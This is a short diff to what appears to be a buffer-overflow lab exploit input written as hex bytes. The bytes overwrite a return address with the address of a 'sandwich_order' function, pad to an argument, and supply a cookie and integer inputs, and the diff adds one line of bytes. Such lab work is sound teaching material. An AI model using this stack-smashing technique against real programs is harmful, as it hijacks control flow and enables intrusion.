@@ -12,4 +12,5 @@
 d0 10 40 00 00 00 00 00 /* 8-byte address to sandwich_order */
 00 00 00 00 00 00 00 00 /* 8-bytes junk to reach arg1 (located 8 bytes away)*/
 d1 9c b2 3f /* cookie to fill arg1*/
+02 03 04 05
 02 03 04 05 /* integer inputs to for sandwhich_order function */
